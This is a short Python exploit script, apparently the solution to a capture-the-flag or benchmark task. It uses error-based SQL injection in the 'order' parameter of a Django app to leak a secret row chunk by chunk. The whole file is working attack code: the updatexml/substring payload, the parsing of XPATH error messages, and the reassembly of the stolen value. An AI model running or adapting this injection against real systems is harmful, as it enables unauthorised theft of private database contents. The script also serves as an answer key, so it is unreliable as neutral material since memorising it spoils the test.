#!/usr/bin/env python3
"""Extract a private row through Django's vulnerable order_by handling."""

import html
import json
import os
import re
import sys
import urllib.error
import urllib.parse
import urllib.request


def extract_chunk(target_url: str, offset: int) -> str:
    expression = (
        "vuln_collection.name) OR updatexml(1,concat(0x7e,"
        "substring((select value from vuln_secret where id=1),"
        f"{offset},20)),1)#"
    )
    url = f"{target_url.rstrip('/')}/vuln/?{urllib.parse.urlencode({'order': expression})}"
    try:
        response = urllib.request.urlopen(url, timeout=20)
    except urllib.error.HTTPError as error:
        response = error
    body = html.unescape(response.read().decode('utf-8', errors='replace'))
    if response.status != 500:
        raise RuntimeError(f"expected SQL error, got HTTP {response.status}")
    match = re.search(r"XPATH syntax error: ['\"]~([^'\"]*)", body)
    if match is None:
        raise RuntimeError('SQL error did not disclose a value chunk')
    return match.group(1)


def extract_secret(target_url: str) -> str:
    chunks = []
    for offset in range(1, 129, 20):
        chunk = extract_chunk(target_url, offset)
        chunks.append(chunk)
        if len(chunk) < 20:
            break
    else:
        raise RuntimeError('private value exceeded the supported length')
    value = ''.join(chunks)
    if not re.fullmatch(r'jaylbreak\.win\{[^}]+\}', value):
        raise RuntimeError('SQL error did not disclose a complete flag')
    return value


def main() -> None:
    target_url = os.environ['REMOTE_TARGET_URL']
    value = extract_secret(target_url)
    print(json.dumps({
        'evidence_payload': {
            'table_name': 'vuln_secret',
            'data': [{'value': value}],
        },
    }))


if __name__ == '__main__':
    try:
        main()
    except (RuntimeError, OSError) as error:
        print(str(error), file=sys.stderr)
        raise SystemExit(1)
